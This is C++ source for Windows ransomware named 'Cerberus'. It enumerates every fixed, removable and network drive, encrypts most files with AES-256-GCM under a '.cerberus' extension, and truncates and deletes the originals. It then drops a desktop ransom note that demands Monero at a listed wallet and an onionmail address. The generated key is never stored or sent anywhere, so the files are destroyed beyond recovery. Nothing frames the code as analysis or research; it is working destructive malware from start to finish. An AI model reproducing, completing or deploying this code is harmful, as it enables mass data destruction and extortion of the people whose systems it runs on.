#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/aes.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "libcrypto.lib")

#define RANSOM_EXTENSION L".cerberus"
#define RANSOM_NOTE_NAME L"!DECRYPT_FILES.txt"
#define MUTEX_NAME L"Global\\CerberusMutex"
#define BUFFER_SIZE 65536
#define KEY_SIZE 32
#define IV_SIZE 12
#define TAG_SIZE 16
#define RANDOM_NAME_LENGTH 16

typedef struct _ENCRYPTION_KEY {
    BYTE key[KEY_SIZE];
    BYTE iv[IV_SIZE];
} ENCRYPTION_KEY;

std::vector<std::wstring> g_file_list;
CRITICAL_SECTION g_list_lock;
ENCRYPTION_KEY g_encryption_key;
wchar_t g_note_path[MAX_PATH];

void generate_random_key(ENCRYPTION_KEY* key_struct) {
    RAND_bytes(key_struct->key, KEY_SIZE);
    RAND_bytes(key_struct->iv, IV_SIZE);
}

void securely_delete_file(const std::wstring& file_path) {
    HANDLE hFile = CreateFileW(file_path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER zero_size = {0};
        SetFilePointerEx(hFile, zero_size, NULL, FILE_BEGIN);
        SetEndOfFile(hFile);
        CloseHandle(hFile);
    }

    wchar_t random_name[RANDOM_NAME_LENGTH + 1];
    BYTE random_bytes[RANDOM_NAME_LENGTH];
    RAND_bytes(random_bytes, RANDOM_NAME_LENGTH);

    for (int i = 0; i < RANDOM_NAME_LENGTH; ++i) {
        random_name[i] = (wchar_t)((random_bytes[i] % 26) + L'a');
    }
    random_name[RANDOM_NAME_LENGTH] = L'\0';

    wchar_t dir_path_buffer[MAX_PATH];
    wcscpy_s(dir_path_buffer, file_path.c_str());
    PathRemoveFileSpecW(dir_path_buffer);

    std::wstring random_path = std::wstring(dir_path_buffer) + L"\\" + random_name;

    MoveFileW(file_path.c_str(), random_path.c_str());
    SetFileAttributesW(random_path.c_str(), FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(random_path.c_str());
}

void encrypt_and_destroy_file(const std::wstring& file_path, const ENCRYPTION_KEY* key) {
    HANDLE hOriginalFile = CreateFileW(file_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hOriginalFile == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER file_size;
    if (!GetFileSizeEx(hOriginalFile, &file_size) || file_size.QuadPart == 0) {
        CloseHandle(hOriginalFile);
        securely_delete_file(file_path);
        return;
    }

    std::wstring encrypted_path = file_path + RANSOM_EXTENSION;
    HANDLE hEncryptedFile = CreateFileW(encrypted_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hEncryptedFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hOriginalFile);
        securely_delete_file(file_path);
        return;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key->key, key->iv);

    BYTE* buffer = (BYTE*)malloc(BUFFER_SIZE);
    BYTE* out_buffer = (BYTE*)malloc(BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH);
    DWORD total_bytes_read = 0;

    while (total_bytes_read < file_size.QuadPart) {
        DWORD bytes_to_read = (DWORD)min(BUFFER_SIZE, file_size.QuadPart - total_bytes_read);
        DWORD bytes_read = 0;
        if (!ReadFile(hOriginalFile, buffer, bytes_to_read, &bytes_read, NULL) || bytes_read == 0) break;

        int out_len = 0;
        EVP_EncryptUpdate(ctx, out_buffer, &out_len, buffer, bytes_read);
        WriteFile(hEncryptedFile, out_buffer, out_len, NULL);

        total_bytes_read += bytes_read;
    }

    int out_len = 0;
    EVP_EncryptFinal_ex(ctx, out_buffer, &out_len);
    if (out_len > 0) {
        WriteFile(hEncryptedFile, out_buffer, out_len, NULL);
    }

    BYTE tag[TAG_SIZE];
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_SIZE, tag);
    WriteFile(hEncryptedFile, tag, TAG_SIZE, NULL);

    EVP_CIPHER_CTX_free(ctx);
    free(buffer);
    free(out_buffer);
    CloseHandle(hEncryptedFile);
    CloseHandle(hOriginalFile);

    securely_delete_file(file_path);
}

void scan_directory(const std::wstring& dir_path) {
    WIN32_FIND_DATAW find_data;
    std::wstring search_path = dir_path + L"\\*";
    HANDLE hFind = FindFirstFileW(search_path.c_str(), &find_data);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(find_data.cFileName, L".") == 0 || wcscmp(find_data.cFileName, L"..") == 0) continue;

        std::wstring full_path = dir_path + L"\\" + find_data.cFileName;

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_directory(full_path);
        } else {
            const wchar_t* exclude_extensions[] = { L".dll", L".exe", L".sys", L".cerberus", L".lnk", L".ini", L".bat", L".cmd", NULL };
            bool should_encrypt = true;
            wchar_t* file_ext = wcsrchr(find_data.cFileName, L'.');

            if (file_ext) {
                for (int i = 0; exclude_extensions[i] != NULL; i++) {
                    if (_wcsicmp(file_ext, exclude_extensions[i]) == 0) {
                        should_encrypt = false;
                        break;
                    }
                }
            }

            if (should_encrypt) {
                EnterCriticalSection(&g_list_lock);
                g_file_list.push_back(full_path);
                LeaveCriticalSection(&g_list_lock);
            }
        }
    } while (FindNextFileW(hFind, &find_data) != 0);

    FindClose(hFind);
}

DWORD WINAPI encryption_thread(LPVOID lpParam) {
    WCHAR drives[] = L"C:\\";
    DWORD drive_mask = GetLogicalDrives();

    for (int i = 0; i < 26; i++) {
        if (drive_mask & (1 << i)) {
            drives[0] = 'A' + i;
            UINT drive_type = GetDriveTypeW(drives);

            if (drive_type == DRIVE_FIXED || drive_type == DRIVE_REMOVABLE || drive_type == DRIVE_REMOTE) {
                WIN32_FIND_DATAW find_data;
                std::wstring search_path = std::wstring(drives) + L"\\*";
                HANDLE hFind = FindFirstFileW(search_path.c_str(), &find_data);

                if (hFind != INVALID_HANDLE_VALUE) {
                    do {
                        if (wcscmp(find_data.cFileName, L".") == 0 || wcscmp(find_data.cFileName, L"..") == 0) continue;

                        std::wstring full_path = std::wstring(drives) + L"\\" + find_data.cFileName;
                        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                            scan_directory(full_path);
                        }
                    } while (FindNextFileW(hFind, &find_data) != 0);
                    FindClose(hFind);
                }
            }
        }
    }

    for (const auto& file_path : g_file_list) {
        encrypt_and_destroy_file(file_path, &g_encryption_key);
    }

    HANDLE hNote = CreateFileW(g_note_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNote != INVALID_HANDLE_VALUE) {
        DWORD bytes_written;
        char note_content[] = "Your files have been encrypted by Cerberus Collective.\n\n"
                             "To get your files back, you need to pay a ransom in Monero (XMR).\n\n"
                             "Send 0,0026 XMR to the following address:\n"
                             "45RFbz2ciA8hYki6PzdnDBFLkM1q452zcbWbfMaD2P1x15tPaq5TvV9USePvQ9oeciS2Jsx4Xng8R4WemSTPjGrQ2hj3ViY\n\n"
                             "After payment, contact us at cerberus@onionmail.org with your personal ID for decryption instructions.\n\n"
                             "Personal ID: 2445433\n\n"
                             "Any attempt to modify or rename the files will result in permanent data loss.\n"
                             "We have securely wiped the original files. Recovery is impossible without the decryption key.";
        WriteFile(hNote, note_content, strlen(note_content), &bytes_written, NULL);
        CloseHandle(hNote);
    }

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }

    InitializeCriticalSection(&g_list_lock);
    generate_random_key(&g_encryption_key);

    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, g_note_path);
    wcscat_s(g_note_path, MAX_PATH, L"\\");
    wcscat_s(g_note_path, MAX_PATH, RANSOM_NOTE_NAME);

    HANDLE hThread = CreateThread(NULL, 0, encryption_thread, NULL, 0, NULL);
    if (hThread == NULL) {
        DeleteCriticalSection(&g_list_lock);
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    DeleteCriticalSection(&g_list_lock);
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);

    return 0;
}
